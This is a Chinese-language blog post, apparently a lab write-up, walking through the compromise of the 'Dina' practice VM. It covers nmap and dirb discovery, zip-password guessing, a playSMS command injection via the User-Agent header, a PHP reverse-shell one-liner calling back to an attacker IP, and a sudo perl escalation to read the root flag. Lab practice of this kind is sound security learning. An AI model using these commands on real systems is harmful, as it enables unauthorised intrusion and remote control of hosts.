@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ch3cke.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Dian是一台渗透测试用的虚拟环境，只是用于娱乐的主机，不过玩的还是挺开心的。写点笔记作为参考。使用的网络环境为NAT模式。 发现目标主机利用扫描工具nmap扫描目标网段，寻找存活的目标主机。我的NAT模式网段在192.168.43.1这个网段上，可以用命令： nmap 192.168.43.0&#x2F;24 扫描目标端内所有的存活主机  发现目标主机：192.168.43.130 开放端口：80 访问目">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Dina渗透">
+<meta property="og:url" content="http://ch3cke.github.io/2018/12/08/Dina%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:site_name" content="ch3cke的小站">
+<meta property="og:description" content="Dian是一台渗透测试用的虚拟环境，只是用于娱乐的主机，不过玩的还是挺开心的。写点笔记作为参考。使用的网络环境为NAT模式。 发现目标主机利用扫描工具nmap扫描目标网段，寻找存活的目标主机。我的NAT模式网段在192.168.43.1这个网段上，可以用命令： nmap 192.168.43.0&#x2F;24 扫描目标端内所有的存活主机  发现目标主机：192.168.43.130 开放端口：80 访问目">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181128233231.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181203152020.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206142134.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206142626.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206143717.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206144238.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206144245.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206144851.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206145215.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206145522.png">
+<meta property="article:published_time" content="2018-12-08T08:35:17.000Z">
+<meta property="article:modified_time" content="2019-01-24T09:11:23.140Z">
+<meta property="article:author" content="ch3cke">
+<meta property="article:tag" content="-总结">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181128233231.png">
+
+<link rel="canonical" href="http://ch3cke.github.io/2018/12/08/Dina%E6%B8%97%E9%80%8F/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Dina渗透 | ch3cke的小站</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ch3cke的小站</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">长夜将至，我从今日起开始守望</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://ch3cke.github.io/2018/12/08/Dina%E6%B8%97%E9%80%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ch3cke">
+      <meta itemprop="description" content="万物皆虚，万事皆允">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ch3cke的小站">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Dina渗透
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-12-08 16:35:17" itemprop="dateCreated datePublished" datetime="2018-12-08T16:35:17+08:00">2018-12-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-01-24 17:11:23" itemprop="dateModified" datetime="2019-01-24T17:11:23+08:00">2019-01-24</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Dian是一台渗透测试用的虚拟环境，只是用于娱乐的主机，不过玩的还是挺开心的。写点笔记作为参考。使用的网络环境为NAT模式。</p>
+<h2 id="发现目标主机"><a href="#发现目标主机" class="headerlink" title="发现目标主机"></a>发现目标主机</h2><p>利用扫描工具nmap扫描目标网段，寻找存活的目标主机。我的NAT模式网段在192.168.43.1这个网段上，可以用命令：</p>
+<p><code>nmap 192.168.43.0/24</code></p>
+<p>扫描目标端内所有的存活主机</p>
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181128233231.png"></p>
+<p>发现目标主机：<code>192.168.43.130</code></p>
+<p>开放端口：<code>80</code></p>
+<p>访问目标服务器<img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181203152020.png"></p>
+<p>查看源代码什么的，发现没有什么入口什么的。可能需要寻找其他的入侵点。</p>
+<h2 id="发现登录入口"><a href="#发现登录入口" class="headerlink" title="发现登录入口"></a>发现登录入口</h2><p>没事就看看robots.txt，没准就有惊喜。查看robots.txt。真的有惊喜！！！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /ange1</span><br><span class="line">Disallow: /angel1</span><br><span class="line">Disallow: /nothing</span><br><span class="line">Disallow: /tmp</span><br><span class="line">Disallow: /uploads</span><br></pre></td></tr></table></figure>
+
+<p>这几个几个页面依次访问一下，除了<code>\nothing</code>这个页面，其他的都一个个文件夹，一度让我以为是文件上传，卡了很久。。。。。。头疼。后来想了一下，会不会还有什么页面没有出现，用<code>dirb</code>–kali下的一个扫描的软件–默认字典就够了。</p>
+<p>发现页面：<code>http://192.168.43.130/secure/</code>，访问得到一个压缩包，打开需要密码，结合前面noting页面发现的几个密码，一个个尝试发现工作量也不是很大，或者使用zip2John爆破，可以发现密码为<code>freedom</code></p>
+<p>nothing页面发现的密码：</p>
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206142134.png"></p>
+<p>打开压缩包，提取文件，是一个后缀为MP3的文件，但是。。。我并不想听音乐，所以，先用strings命令查看一下有没有特殊的东西，有线索。。</p>
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206142626.png"></p>
+<p>ok,发现新的页面，继续访问，是个登录页面，从压缩包中获取的文件得知，只有用户名，密码还是得一个个试。。。。测试过后得到：</p>
+<p><code>username：touhid</code></p>
+<p><code>password：diana</code></p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>登录，发现是一个playSMS的网站，上网找一下有没有漏洞，早exploit-DB上面发现一个远程命令执行，发现可以使用，具体漏洞：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/42044%E3%80%82%E6%9F%A5%E7%9C%8B%E5%8F%AF%E7%9F%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%82%B9%E5%9C%A8%E4%BA%8E%E7%94%B5%E8%AF%9D%E7%B0%BF%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E7%9A%84%E5%AF%BC%E5%85%A5%EF%BC%8C%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%9C%A8%E6%BC%8F%E6%B4%9E%E8%AF%B4%E6%98%8E%E4%B8%AD%E5%BE%88%E6%B8%85%E6%A5%9A%E3%80%82%E7%9B%B4%E6%8E%A5%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E3%80%82">https://www.exploit-db.com/exploits/42044。查看可知漏洞的点在于电话簿用户信息的导入，具体利用方式在漏洞说明中很清楚。直接可以使用。</a></p>
+<p>漏洞利用文件：</p>
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206143717.png"></p>
+<p>上传，利用burpsuite抓包，由于执行的命令在USER_AGENT，所以修改http请求的USER_AGENT的内容为我们要执行的命令就可以了。</p>
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206144238.png"></p>
+<p>结果：</p>
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206144245.png"></p>
+<p>下一步就是反弹shell了，我的kali攻击机的IP地址为：192.168.43.129，所以把shell反弹到这就行了，监听kali 的8008端口：</p>
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206144851.png"></p>
+<p>利用命令：</p>
+<p><code>php -r &#39;$sock=fsockopen(&quot;192.168.43.129&quot;,8008);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p>
+<p>getshell:</p>
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206145215.png"></p>
+<p>成功进入主机！！！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo perl -e &#x27;exec &quot;cat /root/flag.txt&quot;;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206145522.png"></p>
+<p>hack it！！</p>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%80%BB%E7%BB%93/" rel="tag"># -总结</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/12/08/CTF%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97/" rel="prev" title="CTF学习指南">
+      <i class="fa fa-chevron-left"></i> CTF学习指南
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/04/23/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-Writeup/" rel="next" title="第十二届全国大学生信息安全竞赛--Writeup">
+      第十二届全国大学生信息安全竞赛--Writeup <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%91%E7%8E%B0%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA"><span class="nav-number">1.</span> <span class="nav-text">发现目标主机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%91%E7%8E%B0%E7%99%BB%E5%BD%95%E5%85%A5%E5%8F%A3"><span class="nav-number">2.</span> <span class="nav-text">发现登录入口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getshell"><span class="nav-number">3.</span> <span class="nav-text">getshell</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ch3cke"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">ch3cke</p>
+  <div class="site-description" itemprop="description">万物皆虚，万事皆允</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ch3cke" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ch3cke" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ch3cke</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  <script async src="/js/cursor/fireworks.js"></script>
+
+
+
+
+  <script src="/js/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+</body>
+</html>
